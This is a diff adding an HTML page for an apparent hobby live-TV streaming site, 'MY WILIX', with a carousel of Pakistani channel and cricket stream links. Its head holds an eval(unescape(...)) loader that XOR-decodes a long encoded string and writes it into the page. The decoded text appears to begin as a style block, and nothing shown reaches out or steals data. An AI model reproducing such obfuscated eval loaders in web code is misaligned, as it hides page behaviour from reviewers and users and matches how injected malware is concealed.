@@ -1,0 +1,2518 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<center>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MY WILIX </title>
+</head>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
+
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js"
+    integrity="sha384-ygbV9kiqUc6oa4msXn9868pTtWMgiQaeYH7/t7LECLbyPA2x65Kgf80OJFdroafW"
+    crossorigin="anonymous"></script>
+
+
+
+
+<link href="https://unpkg.com/video.js/dist/video-js.css" rel="stylesheet">
+</link>
+<script src="https://unpkg.com/video.js/dist/video.js"></script>
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+
+<link href="https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet">
+
+<!-- <script type='text/javascript' src="https://cdn.jsdelivr.net/npm/afterglowplayer@1/dist/afterglow.min.js"></script> -->
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%73%35%63%65%61%32%33%35%37%61%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%37%31%32%39%34%38%36%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%36%36%39%36%33%32%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%36%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%73%35%63%65%61%32%33%35%37%61%28%27') + '%30%6e%68%74%67%5b%3c%01%02%13%1c%19%18%01%07%01%03%29%58%6d%58%75%7c%01%07%18%1c%19%1c%5b%5a%59%61%67%6a%60%69%6b%5c%21%5e%6f%61%68%68%30%1c%1b%39%36%29%28%2c%29%1c%1c%62%63%6e%6f%6a%67%5d%6b%6c%33%04%02%1d%1b%1e%1e%66%6f%61%68%24%62%5d%64%65%61%72%30%1e%21%5d%63%6c%65%5d%21%6e%75%6a%6f%5b%63%20%3a%6f%65%6b%67%41%58%5b%4a%72%69%6a%59%61%49%6f%6b%6c%20%6e%59%66%68%5b%1e%69%65%2f%6a%6a%5e%6f%6d%6f%21%68%76%77%67%59%61%20%6c%5e%69%6b%68%68%27%59%5f%6e%68%52%6a%5c%64%60%25%66%64%6d%5f%1e%6b%5d%61%6b%25%5c%6a%6a%65%59%1b%69%5f%6e%6b%2f%64%5c%64%76%5c%68%64%5c%5f%1e%6e%59%66%59%25%6f%5d%6b%6b%20%6c%5b%68%65%66%3c%01%07%18%1c%19%1c%20%70%5b%58%63%65%67%21%63%6b%6e%6d%21%6a%66%6d%6d%68%64%6a%6e%62%36%1c%58%6e%69%62%5f%62%65%5d%64%59%5d%37%01%07%71%00%05%03%00%2e%66%52%21%5e%60%59%73%6a%6e%69%23%59%65%6a%54%60%5c%25%60%5c%66%69%27%2c%64%5d%21%54%64%5c%72%6a%6a%6e%20%5c%67%68%5b%60%56%21%6f%61%67%61%68%72%06%00%03%02%1c%13%66%6a%6a%68%24%6b%64%75%5b%30%1c%2a%23%6c%71%37%01%07%1c%1d%5c%6d%62%6f%6a%3d%1c%72%60%65%6d%59%32%06%00%03%02%71%0e%02%04%06%2e%6b%5d%77%5d%5f%68%21%60%6a%67%61%6c%73%04%02%1d%1b%58%5f%5b%63%68%6a%6a%6d%6e%5d%21%5a%68%62%6d%6a%32%14%37%29%28%5d%29%5d%1d%1a%67%63%6c%6f%65%68%58%6a%68%36%01%03%1b%1e%59%6f%60%60%6a%37%18%77%61%65%69%5e%1e%1f%65%61%63%6f%6f%6c%5d%6b%68%32%06%00%73%01%02%0e%02%2b%6f%60%60%58%58%62%63%65%73%01%0d%01%07%18%1c%5f%6f%6b%5f%5b%68%21%6a%52%58%60%6d%6b%37%1c%2c%2e%6e%76%33%01%0d%1c%19%65%5d%6f%67%64%69%23%62%59%66%67%32%19%59%69%6d%6f%32%06%00%1e%1c%61%52%6a%62%61%6e%24%6a%64%60%66%6a%32%1c%52%69%6d%6b%33%04%02%1d%1b%75%67%58%68%6b%32%19%31%29%1c%33%00%05%1e%1e%64%59%6a%67%61%6c%32%19%5d%68%6f%6d%1e%1d%65%6e%6c%6a%6e%68%58%6e%69%34%03%00%1c%1c%52%60%60%63%6e%24%65%69%5e%63%69%32%1c%54%59%6b%6c%59%6f%1c%1c%62%63%6e%6f%6a%67%5d%6b%6c%33%04%02%1d%1b%6a%5b%74%68%2e%5d%65%61%67%6b%32%1d%5c%5b%6c%68%59%65%1c%18%61%61%69%6f%6b%6f%5f%6c%68%33%0e%02%19%18%58%60%6b%6d%67%5f%77%32%1c%55%60%6a%5f%63%36%01%03%1b%1e%63%5d%6a%68%65%6b%25%68%6a%6c%33%1b%29%6e%74%33%0e%02%19%18%5a%6a%74%20%6c%66%5f%58%6f%78%32%19%28%1c%2d%6c%75%1b%36%6e%74%1c%23%1c%6f%63%5a%58%24%2d%27%1e%2e%20%1c%23%20%19%28%2e%2f%25%21%1b%2e%1e%36%6c%7b%1c%2f%28%6c%71%1c%2d%1b%68%65%5a%5d%2b%2c%25%18%2c%25%1c%2d%27%1e%2e%2e%2d%3a%25%36%05%02%74%01%03%06%00%03%02%2e%6f%65%73%5d%73%04%02%5a%68%62%6d%6a%32%13%77%61%61%68%5c%33%00%05%58%5f%5b%63%68%6a%6a%6d%6e%5d%21%5a%68%62%6d%6a%32%13%6a%5c%5c%33%04%02%76%62%5a%6a%64%32%13%28%29%68%74%36%01%03%63%5b%67%67%64%67%32%19%2e%2c%69%74%32%06%00%6a%59%74%67%21%58%64%65%62%6e%33%1b%59%5b%6e%68%56%6a%36%05%02%63%6f%6f%6f%23%69%65%72%56%32%19%29%2b%69%74%32%06%00%58%6f%6a%57%59%6f%25%6a%58%58%64%6e%69%30%1c%2b%63%74%36%05%02%5d%65%6a%6b%62%5f%75%32%13%65%6b%64%65%6b%59%32%06%00%6e%5d%58%57%65%6b%63%32%19%29%6d%73%31%03%02%01%0d%71%04%06%01%07%01%03%06%00%03%02%01%0d%01%07%05%02%04%02%2f%5f%67%74%65%6e%6f%65%6b%5d%1c%76%01%03%1b%1e%5a%65%6b%63%60%58%71%32%19%65%6f%67%67%6c%59%21%55%60%6a%5f%63%36%01%03%1b%1e%75%65%58%67%64%37%18%2d%29%2c%6d%73%31%03%02%1c%13%64%5c%61%67%61%68%33%1b%2f%29%2c%6c%7b%33%04%06%1c%19%68%6b%5a%6c%69%65%68%6a%6f%6b%36%1c%6d%6a%5c%69%69%64%6f%6a%6e%1c%2b%2e%6b%36%01%03%1b%1e%58%6f%6a%57%59%6f%25%6a%58%58%64%6e%69%30%1c%29%43%74%36%05%02%19%1c%60%5a%68%65%65%6e%2e%60%5c%62%68%37%1c%2a%6b%76%31%01%02%13%1c%5f%59%5b%66%67%6b%68%6b%6c%58%21%54%6f%65%6b%6a%37%1c%6b%60%58%26%2a%29%26%20%19%29%34%32%20%1d%2b%27%31%01%02%13%1c%64%59%6a%62%65%6f%35%1e%2b%4c%74%3c%01%07%05%02%5f%6f%75%26%69%66%5d%58%60%77%37%18%2c%19%28%6d%73%1e%36%6c%74%13%2c%19%6e%67%5f%5d%25%2b%22%1e%2c%20%13%2c%25%18%2c%2b%2a%24%27%1e%2e%1c%36%63%74%19%2e%2c%69%74%1d%2b%1e%68%67%5a%52%24%29%24%1c%29%20%1d%2b%22%1e%2c%2e%22%35%20%37%01%07%71%00%05%2c%5a%65%76%6a%6e%65%61%6e%5c%32%65%68%74%5b%6a%1c%7c%01%07%18%1c%24%61%6a%26%6a%68%5d%6e%64%66%6a%6e%61%37%1c%6a%5c%5f%62%59%24%22%2e%2f%21%33%19%2f%23%1b%47%3b%1c%35%13%22%2a%05%02%19%1c%20%70%5b%58%63%65%67%21%6d%6e%5d%6b%6b%67%68%68%63%32%1c%64%5b%58%64%59%21%2d%2f%2d%27%31%1c%2f%2d%1c%4e%59%66%58%6a%64%1b%29%23%34%1c%2d%2f%04%06%1c%19%68%6b%5a%6c%69%66%6f%65%61%37%18%6b%5e%5d%61%5e%26%2f%2e%2a%2a%33%19%05%02%74%01%03%06%00%2c%72%6f%60%61%19%77%01%07%01%03%1b%1e%6e%5d%58%57%65%6b%63%32%19%29%6d%73%31%03%02%1c%13%68%6f%59%6e%6e%65%69%62%6d%6c%32%1c%67%6a%58%6a%6b%63%6f%6b%66%1e%2c%2a%6b%3c%01%07%18%1c%72%65%59%6f%66%30%1c%2d%23%2c%69%70%33%04%02%1d%1b%66%5b%65%67%6b%68%37%18%2d%2e%2c%6d%73%31%03%02%1c%13%01%07%05%02%19%1c%00%05%73%03%02%01%0d%2e%5f%6d%68%6d%6f%6f%2d%1e%71%01%02%13%1c%72%61%58%6d%64%33%1b%36%2e%19%33%0e%02%19%18%66%6a%6e%69%26%69%67%72%59%3d%1c%2f%28%6c%71%33%00%05%1e%1e%5a%5d%54%63%62%6e%6f%6c%6e%59%26%59%6d%60%6f%65%32%19%1f%36%33%2c%2d%2b%2e%31%1c%01%0d%1c%19%5f%6f%65%6f%6b%35%1e%75%64%65%67%59%36%18%01%07%1c%1d%5d%6d%68%58%59%65%32%19%29%6c%71%1c%6a%68%62%67%58%1c%14%2a%2f%2e%33%04%02%1d%1b%58%6d%6a%58%56%6a%24%6e%5d%5d%65%68%6c%30%1e%29%4c%7b%33%04%06%71%04%02%00%05%03%00%2e%5a%66%68%6d%6b%6e%2f%32%65%68%74%5b%6a%1c%7c%01%07%18%1c%5f%5d%5a%64%65%68%6f%69%61%58%24%5f%6f%65%6f%6b%35%1e%19%34%5d%23%2c%29%28%33%04%02%1d%1b%59%6d%60%6f%65%32%19%73%64%60%68%58%34%03%00%71%01%0d%01%07%05%02%04%02%00%05%03%00%01%02%21%65%64%63%5b%65%5d%6a%6c%1e%71%01%02%13%1c%5d%61%6b%69%60%5c%72%30%1e%65%6e%6f%65%6b%5d%21%5f%60%6e%5c%61%31%01%02%13%1c%72%61%58%6d%64%33%1b%36%2e%6c%74%3c%01%07%18%1c%61%59%64%60%66%6a%32%1c%3b%2c%69%70%33%04%02%1d%1b%6a%68%5d%6e%64%65%6d%61%6f%6b%32%1d%6f%68%5f%6e%6b%69%6f%6f%65%1c%2b%2a%6a%34%03%00%1c%1c%55%6f%6f%5c%59%6f%21%6b%5a%5a%67%69%6b%3d%1c%2c%48%74%36%01%03%1b%1e%58%5d%5b%6c%67%6f%6b%69%6b%58%20%5c%6d%62%6f%6a%3d%1c%6f%63%5a%21%2a%28%2e%22%1e%2d%34%38%20%19%28%25%36%01%03%1b%1e%63%5d%6a%68%65%6b%36%1c%2d%4c%75%34%03%00%1c%1c%55%6f%6f%5c%59%6f%21%6b%5a%5a%67%69%6b%3d%1c%2c%28%19%36%01%03%06%00%58%6f%74%2e%6b%61%59%58%6a%77%33%1b%2e%1e%28%6c%7b%1c%31%68%74%19%2c%1d%6d%65%58%5d%24%23%20%19%28%20%19%2c%21%1b%2e%2c%2a%25%2f%1c%29%18%36%69%74%1d%2d%2e%6e%74%1c%23%1c%6f%63%5a%58%24%2d%27%1e%2e%20%1c%23%20%19%28%2e%28%35%24%34%03%00%71%01%0d%2e%60%65%67%5e%60%5c%6c%69%30%64%6f%79%59%6f%18%73%04%02%1d%1b%23%63%6b%21%67%6a%58%6a%6b%63%6f%6b%66%30%1e%6b%5b%52%60%5c%20%2d%2b%2a%24%34%1e%2d%22%1c%4a%39%19%31%1c%27%2f%00%05%1e%1e%21%77%56%5a%66%61%68%24%68%6b%5a%6c%69%66%6f%65%61%37%18%6b%5e%5d%61%5e%26%2f%2e%2a%2a%33%19%2b%22%19%4b%5c%61%5f%68%65%1c%24%21%31%18%22%2a%01%03%1b%1e%6a%6a%5d%61%6b%63%6b%6a%64%32%1d%6c%59%5f%60%59%2b%2d%2b%2e%25%36%1c%00%05%73%03%02%01%0d%2e%60%65%67%77%6f%60%1b%71%03%02%01%0d%1c%19%68%5d%5d%58%64%69%65%30%1c%28%63%74%36%05%02%19%1c%69%6d%5f%6c%6b%65%67%65%6a%6a%32%19%68%6b%5a%6c%69%66%6f%65%61%19%2a%2a%6e%33%00%05%1e%1e%77%65%57%68%61%36%1c%32%36%6d%73%31%03%02%1c%13%64%5c%61%67%61%68%33%1b%35%36%6c%74%3c%01%07%18%1c%5f%6f%6b%5f%5b%68%21%6a%52%58%60%6d%6b%37%1c%28%2b%1b%31%01%02%13%1c%5d%61%6b%69%60%5c%72%30%1e%5a%60%60%5b%66%37%01%07%71%00%05%1e%1e%01%02%21%66%58%25%59%70%59%72%06%00%1e%1c%1c%13%5b%6a%64%6f%6f%32%1d%5d%62%5f%5b%63%13%1d%60%65%6c%6a%6a%69%5a%6c%6a%33%01%0d%1c%19%18%1c%63%6f%6f%6f%23%69%65%72%56%32%19%29%2c%69%74%1d%1a%67%63%6c%6f%65%68%58%6a%68%36%01%03%1b%1e%1e%1c%5d%6f%65%62%6a%21%60%68%58%66%69%30%1c%5b%56%6e%6d%5d%6a%36%01%03%1b%1e%1e%1c%68%56%74%6d%25%5d%65%65%66%69%30%1e%5b%59%61%68%5c%6e%33%04%02%1d%1b%1e%1e%61%5d%65%67%60%6a%21%6d%6f%6d%35%1e%23%2d%2a%63%74%36%05%02%19%1c%1d%1b%63%5f%6a%67%6a%6e%24%5e%6f%6d%68%6e%66%30%1e%21%28%23%6c%71%37%01%07%1c%1d%1b%1e%63%5d%6a%68%65%6b%25%6a%60%67%65%6f%30%1e%29%2c%63%74%36%05%02%19%1c%1d%1b%03%00%1c%1c%13%01%07%05%02%19%1c%00%05%73%03%02%01%0d%01%07%05%02%04%02%2f%5c%6d%6b%6e%68%56%6a%76%05%02%19%1c%6d%68%69%67%68%65%60%6e%37%18%5d%5f%6b%6e%67%6b%6a%59%33%0e%02%19%18%5b%6a%60%6e%6d%30%1e%77%64%6a%68%5c%37%01%07%1c%1d%61%62%6d%5d%68%3d%1c%6f%61%67%61%68%32%06%00%1e%1c%61%52%6a%62%61%6e%24%60%58%61%6a%30%1c%28%23%2c%69%70%33%04%02%1d%1b%63%5f%6a%67%6a%6e%24%5e%6f%6d%68%6e%66%30%1e%21%2a%23%6c%71%37%01%07%71%00%05%03%00%01%02%13%01%07%2a%68%6f%59%5c%69%5a%67%6e%67%54%64%58%6a%6e%5c%60%6a%74%03%00%61%5d%65%67%60%6a%21%6d%6f%6d%35%1e%2b%6c%74%3c%01%07%65%5d%6f%67%64%69%23%62%59%66%67%32%19%2d%6c%71%33%00%05%5f%62%65%67%61%21%60%6c%59%64%6b%33%1b%59%5b%6e%68%56%6a%36%05%02%67%69%6a%6f%67%64%75%21%54%6f%6b%6c%59%6b%68%33%1b%59%5b%6e%68%56%6a%36%05%02%74%01%03%06%00%03%02%01%0d%2e%6d%5f%6b%76%01%03%1b%1e%75%65%58%67%64%37%18%37%2c%6c%75%34%03%00%1c%1c%6b%59%60%63%64%6d%32%1d%30%2b%6e%74%33%0e%02%19%18%5a%6a%6a%59%5e%68%30%1c%2a%63%74%19%6f%6f%65%65%59%1b%68%65%5a%24%25%29%2c%24%1c%28%34%36%27%1e%2e%25%33%0e%02%19%18%5a%6a%6a%59%5e%68%23%6a%5d%57%65%6c%6f%32%19%29%2d%1e%31%03%02%1c%13%68%5c%70%68%24%65%6f%5f%5b%6c%68%32%13%29%29%68%74%36%01%03%1b%1e%03%02%71%0e%02%19%18%1c%19%01%03%29%6c%6a%5d%1c%7c%01%07%18%1c%64%5d%6b%60%67%6c%21%68%60%6c%37%18%2a%29%6c%75%34%03%00%1c%1c%63%6f%6e%61%68%60%6f%6f%35%1e%68%59%60%52%68%60%72%59%36%01%03%1b%1e%6d%76%59%65%66%65%6b%77%37%1c%65%62%5a%5a%59%6e%3c%01%07%05%02%04%02%00%05%73%03%02%2e%52%60%60%63%6e%65%59%67%6f%1e%71%01%02%13%1c%63%64%6f%58%68%33%1b%62%5b%66%68%3c%01%07%18%1c%64%5d%6b%60%67%6c%21%60%56%66%6d%36%1c%28%29%6d%73%31%03%02%1c%13%5b%6a%64%6f%6f%32%1d%6d%65%58%24%2a%26%29%25%18%2d%31%37%21%1b%2e%27%33%01%0d%1c%19%62%6f%6b%68%20%70%5b%67%67%64%67%32%19%5e%6f%65%58%32%06%00%1e%1c%66%60%6e%6d%25%6b%60%72%58%35%1e%2f%29%6c%7b%33%04%06%71%04%02%00%05%2c%5f%60%65%68%6e%6f%61%67%61%68%1d%74%03%00%1c%1c%69%60%6a%59%68%37%1c%6b%62%65%66%68%33%0e%02%19%18%61%58%6a%66%62%6c%23%6a%65%68%64%6d%36%1c%28%29%6d%73%31%03%02%1c%13%66%6a%6a%68%24%6b%64%75%5b%30%1c%2d%26%6c%71%37%01%07%1c%1d%61%6d%6c%68%21%78%59%60%63%64%6d%32%1d%69%6d%68%61%5d%6f%33%04%06%71%04%02%2f%62%63%65%58%65%79%73%04%06%1c%19%1c%1d%66%5f%68%67%65%61%21%6d%6b%6c%37%1c%2b%2e%6e%76%33%01%0d%1c%19%18%1c%58%60%64%60%6c%23%65%68%56%61%6e%36%1c%5e%59%6f%6f%5b%68%33%01%0d%1c%19%18%1c%6d%59%75%6f%23%5f%60%65%68%6e%37%18%5b%5c%6e%69%5e%68%31%01%02%7e%01%07%05%02%04%02%2f%62%63%65%2d%73%0e%02%19%18%1c%19%77%64%5f%6a%66%32%1c%38%2c%1c%37%01%07%71%00%05%03%00%2e%68%56%74%6d%77%01%07%1c%1d%1b%1e%59%6f%60%60%6a%37%18%77%61%65%69%5e%31%03%02%1c%13%1c%19%62%6f%6b%68%20%6c%67%70%59%32%13%5d%6c%6c%6f%36%01%03%76%03%00%01%02%21%68%5c%70%68%58%6a%58%5a%71%03%02%1c%13%1c%19%65%5d%6f%67%64%69%23%6a%6f%6c%3d%1c%2f%28%6c%71%33%00%05%1e%1e%1c%1c%67%59%71%6c%21%58%60%64%60%6c%30%1c%5b%56%6e%6d%5d%6a%36%01%03%76%03%00%01%02%21%66%58%25%68%61%73%00%05%1e%1e%66%6f%61%68%24%6f%65%77%59%33%1b%28%2e%6c%74%13%1d%60%65%6c%6a%6a%69%5a%6c%6a%33%01%0d%1c%19%5f%6f%65%6f%6b%35%1e%68%67%5a%2b%2a%2c%2d%20%19%2d%35%30%22%1e%2c%25%13%1d%60%65%6c%6a%6a%69%5a%6c%6a%33%01%0d%1c%19%65%5d%6f%67%64%69%23%68%65%67%6b%68%37%18%2d%29%6c%75%1b%1f%67%61%6c%60%6a%6d%59%6e%6d%33%00%05%03%00%71%01%0d%2e%60%6c%59%64%1c%64%66%65%1e%73%01%0d%1c%19%5e%6f%6f%58%58%6d%23%68%5d%58%6a%69%6e%36%1c%28%2c%6d%73%31%03%02%71%0e%02%1e%5f%6f%6b%68%58%69%6a%23%5b%6f%61%68%58%61%6e%5c%6a%1d%74%03%00%1c%1c%6e%5d%6f%63%65%6b%21%5b%68%6a%6a%6f%61%3d%1c%2e%28%6c%71%33%00%05%73%03%02%66%60%6f%6d%5d%6a%19%73%00%05%1e%1e%58%65%64%6c%65%59%75%37%1c%66%6d%67%5a%33%01%0d%1c%19%63%6a%60%58%20%60%5f%6e%32%1c%23%2e%2c%5d%61%36%01%03%1b%1e%65%6a%65%57%21%6d%5d%61%69%60%5c%6f%5b%23%5b%6f%6f%69%64%6a%6b%37%1c%6b%5e%6e%5b%5d%68%2b%29%25%18%61%60%6e%60%5a%76%26%2d%2c%63%74%25%18%2d%63%6a%24%22%31%03%02%1c%13%6c%6a%6f%65%6d%65%6e%69%30%1e%66%65%7b%59%5d%37%01%07%1c%1d%5d%6d%6a%68%6f%6e%32%19%28%33%04%02%1d%1b%62%5b%66%68%3d%1c%29%37%01%07%1c%1d%70%67%5a%68%64%3d%1c%28%28%2c%1c%33%00%05%1e%1e%5a%5d%54%63%62%6e%6f%6c%6e%59%26%59%6d%60%6f%65%32%19%72%5d%6f%24%20%26%69%5b%5b%6f%61%58%58%6e%75%3e%6f%61%68%68%27%33%01%0d%1c%19%68%5d%5d%58%64%69%65%30%1c%2c%63%74%19%2c%6c%71%1c%2c%2b%6e%76%33%01%0d%1c%19%66%69%6e%68%64%61%77%23%5b%6f%61%68%5c%6a%68%37%1c%5a%5e%6c%6a%59%6a%3c%01%07%18%1c%58%60%64%60%6c%23%65%68%56%61%6e%36%1c%5e%59%6f%6f%5b%68%33%01%0d%1c%19%18%1c%19%1c%1d%1b%1e%1e%66%6f%61%68%24%6f%65%77%59%33%2a%36%6e%74%33%0e%02%74%05%02%63%6f%6e%6f%5b%68%1c%5d%13%73%04%06%1c%19%68%58%73%6a%23%5d%60%6a%67%6b%36%1c%5e%59%6f%6f%5b%68%33%01%0d%1c%19%5f%6f%65%6f%6b%35%1e%74%5d%6a%2b%21%24%68%6a%60%61%5c%6d%77%39%6f%60%60%6a%20%37%01%07%71%00%05%64%6d%6f%68%56%6a%19%59%32%6b%68%65%26%59%66%65%60%57%24%2e%21%1c%60%1c%72%06%00%1e%1c%5a%52%5b%66%63%6a%6a%69%6f%5f%30%1e%76%5d%65%24%24%25%6c%6f%65%60%5a%68%77%3b%6f%6f%6f%6f%21%33%04%02%1d%1b%58%6d%6a%58%56%6a%24%6e%5d%5d%65%68%6c%30%1e%29%2c%16%33%04%06%1c%19%6c%5c%5f%5a%67%6e%67%3d%1c%28%28%6c%71%1c%2c%2b%6e%76%33%01%0d%1c%19%5f%6f%65%6f%6b%35%1e%74%5d%6a%2b%21%24%6f%59%5e%6f%6f%5f%5f%68%75%4f%63%6c%6a%6f%65%6d%59%24%34%03%00%1c%1c%6e%5d%6f%63%65%6b%21%69%68%6e%30%1c%21%27%2c%69%70%33%04%02%1d%1b%58%6d%6a%58%56%6a%37%18%2a%69%74%1d%6c%6d%62%65%58%13%76%58%6e%24%24%21%6a%5e%59%6d%6e%58%52%6a%70%3f%6f%65%6f%6b%22%31%03%02%71%0e%02%04%06%32%6f%6f%6e%6f%1e%71%01%02%13%1c%24%25%64%63%6b%33%1b%28%74%61%5d%7b%33%04%06%1c%19%21%20%6b%68%67%61%5d%65%75%3e%6b%60%6a%6a%33%1b%6d%68%5d%6e%68%59%36%05%02%19%1c%20%26%69%5b%5b%6f%61%58%58%6e%75%3e%6f%61%68%68%30%1c%1b%3b%5d%29%28%2c%29%33%00%05%1e%1e%21%21%64%59%5e%6b%6e%5d%5d%6b%72%4d%6e%6c%6f%64%65%6d%5d%32%19%77%65%62%6a%5b%33%01%0d%71%04%06%32%37%21%76%5e%58%61%65%68%2e%6b%5e%6e%6f%65%60%5b%5a%68%1e%73%01%0d%1c%19%73%65%5d%68%65%35%1e%2e%59%61%3c%01%07%18%1c%61%59%64%60%66%6a%32%1c%23%59%64%37%01%07%71%00%05%30%30%21%77%56%5a%66%61%68%24%6b%5a%6d%6d%62%60%5a%52%6a%24%6c%64%6c%61%5b%1b%71%03%02%1c%13%5a%58%5f%63%62%6a%6e%6e%6c%5a%32%1c%79%5d%6f%20%21%24%6b%58%5c%6d%6c%58%5d%65%75%3e%6b%60%6a%6a%24%34%03%00%71%01%0d%32%37%25%77%5c%5a%62%62%6a%23%6b%5b%65%6f%65%64%5a%58%6a%20%6f%68%5f%5b%63%13%73%04%06%1c%19%5a%5c%5c%61%65%6a%6f%66%6e%5d%36%1c%6b%6f%6f%5e%31%03%02%71%0e%02%27%18%73%04%02%1d%1b%23%75%59%5a%6c%65%6d%25%69%6e%59%6b%26%69%5b%60%59%54%68%37%18%6e%6a%6e%58%34%03%00%1c%1c%2e%61%6a%76%21%6c%6b%58%6d%23%69%59%60%56%5b%6d%36%1c%6b%6f%6f%5e%31%03%02%1c%13%21%64%6f%21%6c%6b%58%6d%23%69%59%60%56%5b%6d%36%1c%6b%6f%6f%5e%31%03%02%1c%13%69%6e%5d%6a%24%6b%58%67%5b%59%68%32%13%6e%6a%6a%59%36%01%03%76%03%00%01%02%57%65%73%2a%6b%5e%6a%6e%67%62%63%59%6e%66%1c%76%05%02%19%1c%6e%71%5b%68%66%60%60%77%37%18%5d%6c%68%6e%34%03%00%1c%1c%78%64%60%6c%59%24%6b%6d%5a%59%5b%32%1c%61%6f%72%6e%5d%69%33%00%05%73%03%02%01%0d%58%60%72%2e%6e%5b%6b%68%62%62%61%59%61%69%19%59%1c%76%01%03%1b%1e%5a%65%6b%63%60%58%71%32%19%65%6f%67%67%6c%59%21%55%60%6a%5f%63%36%01%03%1b%1e%59%6f%60%60%6a%37%18%77%61%65%69%5e%31%03%02%1c%13%68%5c%70%68%24%5d%61%62%65%6c%32%1c%54%59%6b%6c%59%6f%33%00%05%1e%1e%6c%5d%57%58%60%6a%67%37%1c%2b%6b%76%31%01%02%13%1c%6d%5d%74%6d%21%59%5e%59%6d%6a%5d%67%65%6a%6a%32%19%6e%6e%69%5b%31%01%02%13%1c%64%59%6a%62%65%6f%26%6a%6d%6c%32%13%34%69%70%33%04%02%1d%1b%63%5f%6a%67%6a%6e%24%5e%6f%6d%68%6e%66%30%1e%36%6c%7b%33%04%06%71%04%02%00%05%03%00%01%02%21%5a%6c%6c%68%6a%6e%2b%1b%71%03%02%61%52%6a%62%61%6e%24%60%58%61%6a%30%1c%5d%66%68%6a%37%01%07%61%5c%6d%65%67%6e%21%65%65%62%60%68%37%1c%5c%6e%6a%6d%33%01%0d%77%60%5c%68%61%32%1d%33%2e%1b%33%01%0d%66%6a%6a%68%24%6b%64%75%5b%30%1c%2a%23%6c%71%37%01%07%5a%5c%5c%61%65%6a%6f%66%6e%5d%25%5b%6a%60%6e%6d%30%1e%1b%36%39%2c%29%28%2c%36%1c%00%05%59%6d%60%6f%65%32%19%73%64%60%68%58%34%1e%03%02%5a%60%6a%5d%5d%6a%37%1c%2d%6b%76%1e%6b%6f%6f%65%5d%18%1b%2f%2a%2b%34%03%00%5a%6f%65%58%5c%6e%21%6f%5d%59%62%6b%69%32%1c%26%4c%71%37%01%07%71%00%05%03%00%01%02%21%5a%6c%6c%68%6a%6e%2b%35%66%6d%76%59%65%1c%76%05%02%19%1c%5b%5a%59%61%67%6a%60%69%6b%5c%21%5e%6f%61%68%68%30%1c%1b%3b%5d%29%28%2c%29%33%00%05%1e%1e%5b%6f%6f%6f%6f%36%1c%72%64%64%6f%5b%31%01%02%7e%01%07%05%02%2b%3d%6b%5a%67%6c%1c%73%0e%02%19%18%1c%19%68%58%73%6a%23%5d%60%6a%67%6b%36%1c%5e%59%6f%6f%5b%68%33%01%0d%1c%19%18%1c%58%60%64%60%6c%23%65%68%56%61%6e%36%1c%5e%59%6f%6f%5b%68%33%01%0d%1c%19%18%1c%5d%65%6a%6b%62%5f%75%32%13%65%6b%64%65%6b%59%20%5d%62%6d%5b%63%3c%01%07%18%1c%19%1c%69%6d%5f%6c%6b%65%67%65%6a%6a%32%19%68%6b%5a%6c%69%66%6f%65%61%19%2a%2a%6e%33%00%05%1e%1e%1c%1c%54%6f%65%6b%6a%37%1c%6b%60%58%26%2c%20%13%2c%25%18%2c%20%33%00%05%73%03%02%01%0d%30%2a%6f%68%70%60%58%397129486%36%33%36%37%31%34%34' + unescape('%27%29%29%3b'));
+// -->
+</script>
+
+
+
+<body class="body">
+<style>
+body{
+    background: linear-gradient(to bottom, #c33764 0%,  #1d2671 100%)
+}
+</style>
+
+
+    <div id="carouselExampleIndicators" class="carousel slide" data-bs-ride="carousel">
+
+
+
+        <div class="carousel-inner">
+            <div class="carousel-item active">
+                <a data-toggle="modal" data-target="#myModal7"><img class="slideimg"
+                        src="https://images.mjunoon.tv:8181/slider/1597671098.webp" class="d-block w-100" alt="Hum-Tv">
+                    <div style="position:absolute; top: 20px; left:25px;">
+                        <h6 class="live">LIVE</h6>
+                </a>
+
+            </div>
+        </div>
+        <div class="carousel-item">
+            <a data-toggle="modal" data-target="#myModal15"> <img class="slideimg"
+                    src="https://srv2.jazztv.pk/jazzlive/uploads/slider/pak-vs-sa-slider.png" class="d-block w-100"
+                    alt="pakvssouthafrica">
+                <div style="position:absolute; top: 20px; left:25px;">
